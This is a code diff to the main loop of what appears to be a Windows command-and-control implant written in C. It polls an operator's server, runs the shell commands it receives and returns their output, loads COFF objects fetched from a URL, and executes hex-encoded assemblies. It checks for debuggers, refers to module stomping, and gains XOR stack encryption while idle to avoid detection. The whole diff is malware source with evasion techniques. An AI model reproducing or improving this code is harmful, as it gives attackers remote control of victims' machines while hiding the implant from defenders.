@@ -40,8 +40,6 @@ int main() {
 
     TestingExecuteAssembly();
 
-    // TestingInfoGatherer(victim);
-
     // Check if there is a debugger present every few seconds.
     if (IsDebuggerActive()) {
         Sleep(7000);
@@ -59,7 +57,6 @@ int main() {
             printf("Command %s from server ...\n", command.Cmd);
             printf("File %s from server...\n\n", command.File);
 
-
             // Check if the new command is the same as the previous command
             if (strcmp(previousCommand, command.Input) != 0) {
                 if (!strcmp(command.Input, "coff")) { // Use !strcmp to check for equality
@@ -69,22 +66,14 @@ int main() {
                     COFFLoader(url);
                 }
                 else if (!strcmp(command.Input, "os")) { // Use !strcmp to check for equality
-
-                    //printf("Running: '%s'\n", command.Cmd);
                     char output[100][256] = { 0 };
                     int count = runCmd(command.Cmd, output);
-
-                    /*for (int i = 0; i < count; i++) {
-                        printf("%s", output[i]);
-                    }*/
                     sendResult(command.ImplantUser, command.Operator, output);
                 }
                 else if (!strcmp(command.Input, "execute-assembly")) { // Use !strcmp to check for equality
                     const char* encoded_str = command.File;
                     char* decoded_str = from_hex(encoded_str);
                     execute(decoded_str, "0");
-
-                    //sendResult(command.ImplantUser, command.Operator);
                 }
 
                 // Save the current command as the previous command for the next iteration
@@ -92,6 +81,20 @@ int main() {
             }
             else {
                 printf("No new commands from server...");
+
+                // Encrypt the stack
+                PNT_TIB tib = (PNT_TIB)NtCurrentTeb();
+                PVOID stack_top = tib->StackLimit;
+                PVOID stack_base = tib->StackBase;
+                PVOID fetchCommandAddress = (PVOID)fetchCommand;
+
+                // Check if fetchCommand lies within the stack range
+                if (fetchCommandAddress >= stack_top && fetchCommandAddress <= stack_base) {
+                    // Adjust the range to exclude fetchCommand
+                    stack_base = fetchCommandAddress;
+                }
+
+                xor_stack(stack_top, stack_base);
             }
 
             Sleep(3000);
@@ -101,6 +104,7 @@ int main() {
     }
     return 0;
 }
+
 
 void TestingStomp() {
     moduleStomper();
